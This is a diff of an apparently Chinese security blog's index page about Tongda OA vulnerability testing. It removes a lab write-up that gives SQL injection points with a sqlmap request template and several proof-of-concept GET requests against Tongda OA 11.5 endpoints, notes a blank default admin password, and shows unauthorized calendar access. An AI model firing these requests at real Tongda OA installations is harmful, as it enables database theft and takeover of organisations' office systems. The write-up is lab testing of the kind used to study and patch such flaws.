@@ -155,6 +155,75 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-通达OA漏洞测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/02/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/">通达OA漏洞测试</a>
+    </h1>
+  
+
+        
+        <a href="/2020/09/02/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" class="archive-article-date">
+  	<time datetime="2020-09-02T09:54:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>通达OA任意用户登录及任意文件上传getshell</p>
+<p>影响版本</p>
+<p>通达OA 2017版</p>
+<p>通达OA V11.X&lt;V11.5</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/1.png" alt="img"></p>
+        
+          <a class="article-more-a" href="/2020/09/02/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/09/02/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-通达OA11-5测试记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -178,54 +247,9 @@
         <p>本地安装配置通达oa V11.5</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/1.png" alt="img"></p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/2.png" alt="img"></p>
-<p>用户名：admin 密码为空</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/3.png" alt="img"></p>
-<p>mysql数据库及redis安装默认密码在bin 下 Service.ini中</p>
-<p><a href="http://192.168.233.140/general/appbuilder/web/calendar/calendarlist/getcallist" target="_blank" rel="noopener">http://192.168.233.140/general/appbuilder/web/calendar/calendarlist/getcallist</a></p>
-<p>抓包</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/4.png" alt="img"></p>
-<p>webroot\general\appbuilder\modules\calendar\models\Calendar.php。</p>
-<p>get_callist_data函数接收传入的begin_date变量未经过滤直接拼接在查询语句中造成注入。</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/5.png" alt="img"></p>
-<p>需要普通账号权限登录 某些低版本无需登录也可注入</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/6.png" alt="img"></p>
-<p>存在注入</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/7.png" alt="img"></p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/8.png" alt="img"></p>
-<p>sqlmap包</p>
-<p>POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1</p>
-<p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</p>
-<p>Referer: <a href="http://192.168.233.140/portal/home/" target="_blank" rel="noopener">http://192.168.233.140/portal/home/</a></p>
-<p>Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=524uiccicfvtjcquiocdrtnt33; SID_1=892e0eee</p>
-<p>Connection: keep-alive</p>
-<p>Host: 192.168.233.140</p>
-<p>Pragma: no-cache</p>
-<p>X-Requested-With: XMLHttpRequest</p>
-<p>Content-Length: 154</p>
-<p>X-WVS-ID: Acunetix-Autologin/65535</p>
-<p>Cache-Control: no-cache</p>
-<p>Accept: <em>/</em></p>
-<p>Origin: <a href="http://192.168.233.140" target="_blank" rel="noopener">http://192.168.233.140</a></p>
-<p>Accept-Language: en-US,en;q=0.9</p>
-<p>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</p>
-<p>starttime=*&amp;endtime=1598918400&amp;view=month&amp;condition=1</p>
-<p>注入点2</p>
-<p>orderby</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/9.png" alt="img"></p>
-<p>poc</p>
-<p>GET /general/email/sentbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=sentbox&amp;curnum=3&amp;emailtype=ALLMAIL&amp;keyword=sample%40email.tst&amp;orderby=1&amp;pagelimit=20&amp;tag=&amp;timestamp=1598069133&amp;total= HTTP/1.1X-Requested-With: XMLHttpRequestReferer: <a href="http://192.168.43.169/Cookie" target="_blank" rel="noopener">http://192.168.43.169/Cookie</a>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ffAccept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8Accept-Encoding: gzip,deflateHost: 192.168.43.169User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36Connection: close</p>
-<p>注入点3</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/10.png" alt="img"></p>
-<p>poc</p>
-<p>GET /general/email/inbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=inbox&amp;curnum=0&amp;emailtype=ALLMAIL&amp;keyword=&amp;orderby=3–&amp;pagelimit=10&amp;tag=&amp;timestamp=1598069103&amp;total= HTTP/1.1X-Requested-With: XMLHttpRequestReferer: <a href="http://192.168.43.169Cookie" target="_blank" rel="noopener">http://192.168.43.169Cookie</a>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ffAccept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8Accept-Encoding: gzip,deflateHost: 192.168.43.169User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36Connection: close</p>
-<p>注入点4</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/11.png" alt="img"></p>
-<p>poc</p>
-<p>GET /general/appbuilder/web/report/repdetail/edit?link_type=false&amp;slot={}&amp;id=2 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: <a href="http://192.168.43.169Cookie" target="_blank" rel="noopener">http://192.168.43.169Cookie</a>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ffAccept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8Accept-Encoding: gzip,deflateHost: 192.168.43.169User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36Connection: close</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E9%80%9A%E8%BE%BEOA11.5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/12.png" alt="img"></p>
-<p>未授权访问（时间戳修改）</p>
-<p><a href="http://192.168.233.140/general/calendar/arrange/get_cal_list.php?starttime=1548058874&amp;endtime=1597997506&amp;view=agendaDay" target="_blank" rel="noopener">http://192.168.233.140/general/calendar/arrange/get_cal_list.php?starttime=1548058874&amp;endtime=1597997506&amp;view=agendaDay</a></p>
-
+        
+          <a class="article-more-a" href="/2020/09/02/%E9%80%9A%E8%BE%BEOA11-5%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/#more">more >></a>
+        
       
 
       
@@ -801,72 +825,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/09/02/Adobe-flash-player-28%EF%BC%88CVE-2018-4878%EF%BC%89%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Holer内网穿透搭建记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/">Holer内网穿透搭建记录</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-  	<time datetime="2020-09-02T08:15:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在公网服务器上搭建holer服务端</p>
-<p>Holer是一个将局域网中的应用映射到公网访问的端口映射软件，支持转发基于TCP协议的报文。 </p>
-        
-          <a class="article-more-a" href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/">展开全文 >></a>
         </p>
       
 
